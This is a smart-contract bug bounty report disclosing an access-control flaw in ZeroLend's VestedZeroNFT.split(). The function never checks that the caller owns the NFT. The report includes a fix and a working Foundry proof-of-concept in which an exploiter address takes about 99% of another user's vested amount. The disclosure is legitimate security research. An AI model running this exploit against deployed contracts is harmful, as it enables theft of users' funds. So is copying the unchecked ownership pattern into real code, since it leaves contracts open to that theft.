# 29288 - \[SC - Critical] all NFTs can be stolen by calling VestedZeroNFT...

Submitted on Mar 13th 2024 at 11:27:54 UTC by @EricTee for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29288

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Wrong implementation in `VestedZeroNFT::split()` causes users' NFT to be stolen by anyone. Specifically, the problem arises from the `ERC721Upgradeable.sol::_requireOwned` check in `VestedZeroNFT::split()` which fails to check the caller is the owner of the NFT, allow anyone to split the `pendingAmount` and `upfrontAmount` of any `tokenId` up to 99%.

## Vulnerability Details

In `VestedZeroNFT::split()`:

```
 function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
        _requireOwned(tokenId);

// REDACTED by erictee
```

the `_requireOwned` check is not implemented correctly. Let's take a look at `ERC721Upgradeable.sol::_requireOwned` in Openzeppelin:

```
 function _requireOwned(uint256 tokenId) internal view returns (address) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
        return owner;
    }
```

This function only return the address of the NFT owner but never revert if the caller is not the NFT owner. Therefore, anyone can call `VestedZeroNFT::split()` with any `tokenId` and to steal `pendingAmount` and `upfrontAmount` up to 99%.

## Impact Details

Direct theft of any user rewards.

## Recommendation

Consider making the following changes in `VestedZeroNFT::split()`:

```diff
 function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
--        _requireOwned(tokenId);
++       require(msg.sender == _requireOwned(tokenId), "NFT Owner only!"); 
// REDACTED by erictee
```

## References

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L234>

## Proof of Concept

* Install foundry.
* Rename the original test folder to `hardhat-test` and create a new folder name `test`.
* Add forge-std module to lib with command: `git submodule add https://github.com/foundry-rs/forge-std lib/forge-std`
* add `remappings.txt` file in `contracts` folder with the following content:

```
@ethereum-waffle/=node_modules/@ethereum-waffle/
@layerzerolabs/=node_modules/@layerzerolabs/
@openzeppelin-3/=node_modules/@openzeppelin-3/
@openzeppelin/=node_modules/@openzeppelin/
@prb/=node_modules/@prb/
@sablier/=node_modules/@sablier/
@uniswap/=node_modules/@uniswap/
@zerolendxyz/=node_modules/@zerolendxyz/
base64-sol/=node_modules/base64-sol/
erc721a/=node_modules/erc721a/
eth-gas-reporter/=node_modules/eth-gas-reporter/
forge-std/=lib/forge-std/src/
hardhat-deploy/=node_modules/hardhat-deploy/
hardhat/=node_modules/hardhat/
ds-test/=lib/forge-std/lib/ds-test/src/
```

* Add `VestedZeroNFT.t.sol` file within test folder with the following content:

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {VestedZeroNFT} from "../contracts/vesting/VestedZeroNFT.sol";
import {ZeroLend} from "../contracts/ZeroLendToken.sol";
import {StakingBonus} from "../contracts/vesting/StakingBonus.sol";
import {IVestedZeroNFT} from "../contracts/interfaces/IVestedZeroNFT.sol";
contract VestedZeroNFTTest is Test {
   
    address public admin;
    VestedZeroNFT public vesting;
    ZeroLend public zero;
    StakingBonus public stakingbonus;
    address public bob;
    address public exploiter;

    function setUp() public {
        vesting = new VestedZeroNFT();
        zero = new ZeroLend();
        stakingbonus = new StakingBonus(); //erictee: no need to init here as this is for testing.

        vesting.init(address(zero),address(stakingbonus));
        bob = makeAddr("BOB");
        exploiter = makeAddr("EXPLOITER");

        zero.togglePause(false);

    }

    
    function test_correct() external {
        console.log(address(vesting));
        console.log(address(vesting.zero()));
        console.log(zero.balanceOf(address(this)));
    }
    
    function test_StealAmountBySplitting() external {
        // preparation
        zero.approve(address(vesting), type(uint256).max);
        vesting.mint(
        bob, 
        15e18,   // 15 ZERO linear vesting
        5e18,  // 5 ZERO upfront
        1000,  // linear duration - 1000 seconds
        500,  // cliff duration - 500 seconds
        block.timestamp + 1000,  // unlock date
        false,   // penalty -> false
        IVestedZeroNFT.VestCategory.PRIVATE_SALE // 0
        );  // Same config as typescript testcase.

        vm.warp(block.timestamp + 1000); //fast forward to unlock date.

       (uint256 upfrontBefore, uint256 pendingBefore ) = vesting.claimable(1); // tokenId = 1
       console.log("UPFRONT BOB Before: ", upfrontBefore);
       console.log("PENDING BOB Before: ", pendingBefore);

       vm.startPrank(exploiter);
       vesting.split(1, 1); // tokenId = 1 , fraction =1 

    
       vm.stopPrank();

       (uint256 upfrontExploiter, uint256 pendingExploiter) = vesting.claimable(2); // exploiter owns the tokenId 2 
       console.log("UPFRONT EXPLOITER: ", upfrontExploiter);
       console.log("PENDING EXPLOITER: ", pendingExploiter);



       (uint256 upfrontAfter, uint256 pendingAfter ) = vesting.claimable(1); // tokenId = 1
       console.log("UPFRONT BOB After: ", upfrontAfter);
       console.log("PENDING BOB After: ", pendingAfter);


    }
}
```

* Finally, run the foundry test with : `forge test --match-test test_StealAmountBySplitting -vv`

Foundry Result:

```
Running 1 test for test/VestedZeroNFT.t.sol:VestedZeroNFTTest
[PASS] test_StealAmountBySplitting() (gas: 656485)
Logs:
  UPFRONT BOB Before:  5000000000000000000
  PENDING BOB Before:  0
  UPFRONT EXPLOITER:  4999500000000000000
  PENDING EXPLOITER:  0
  UPFRONT BOB After:  500000000000000
  PENDING BOB After:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.15ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
